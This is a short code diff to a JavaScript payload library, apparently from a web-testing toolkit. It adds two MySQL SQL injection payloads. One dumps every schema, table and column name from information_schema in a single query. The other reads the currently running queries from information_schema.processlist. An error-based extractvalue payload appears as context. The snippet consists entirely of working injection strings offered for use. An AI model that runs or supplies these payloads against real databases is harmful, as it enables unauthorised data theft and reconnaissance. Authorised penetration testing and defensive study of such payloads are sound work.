@@ -61,6 +61,10 @@ window.Payload.SQLi = {
         ' from information_schema.columns where table_schema=database()'
     },
 
+    dumpInOneShot: value => "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",
+
+    dumpCurrentQueries: value => "(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a)",
+
     errorBased: ({ columns, position }) => {
       return 'extractvalue(0x0a,concat(0x0a,(select database())))'
     }
